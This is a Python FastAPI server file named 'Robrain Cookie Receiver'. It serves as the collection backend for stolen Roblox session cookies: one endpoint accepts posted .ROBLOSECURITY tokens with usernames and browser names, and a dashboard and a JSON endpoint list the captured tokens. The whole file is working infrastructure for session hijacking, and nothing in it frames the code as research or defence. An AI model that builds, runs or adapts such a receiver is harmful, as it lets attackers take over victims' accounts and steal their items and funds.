from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import json
from datetime import datetime

app = FastAPI(title="Robrain Cookie Receiver")
cookies_db = []

class CookieData(BaseModel):
    cookie: str
    username: str
    browser: str = "Chrome"
    timestamp: str = ""

@app.get("/")
async def dashboard():
    rows = ""
    for c in reversed(cookies_db[-50:]):
        rows += f"<tr><td>{c['time']}</td><td>{c['username']}</td><td style='font-size:11px;word-break:break-all;max-width:500px'>{c['cookie']}</td><td>{c['browser']}</td></tr>"

    return HTMLResponse(f"""<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><title>Robrain Dashboard</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:#0d1117; color:#e6edf3; font-family:'Segoe UI',sans-serif; padding:30px; }}
h1 {{ color:#58a6ff; margin-bottom:10px; }}
table {{ width:100%; border-collapse:collapse; margin-top:15px; }}
th, td {{ padding:10px 12px; text-align:left; border-bottom:1px solid #30363d; }}
th {{ background:#161b22; color:#7d8590; font-size:12px; text-transform:uppercase; }}
tr:hover td {{ background:#1c2333; }}
.stats {{ color:#7d8590; font-size:14px; margin-bottom:20px; }}
</style></head>
<body>
<h1>Robrain Dashboard</h1>
<div class="stats">Total cookies received: {len(cookies_db)}</div>
<table><thead><tr><th>Time</th><th>Username</th><th>Cookie (.ROBLOSECURITY)</th><th>Browser</th></tr></thead>
<tbody>{rows}</tbody></table>
</body></html>""")

@app.post("/api/cookie")
async def receive_cookie(data: CookieData):
    entry = {
        "time": data.timestamp or datetime.utcnow().isoformat(),
        "username": data.username,
        "cookie": data.cookie,
        "browser": data.browser,
    }
    cookies_db.append(entry)
    return {"status": "ok", "total": len(cookies_db)}

@app.get("/api/cookies")
async def get_cookies():
    return cookies_db[-50:]
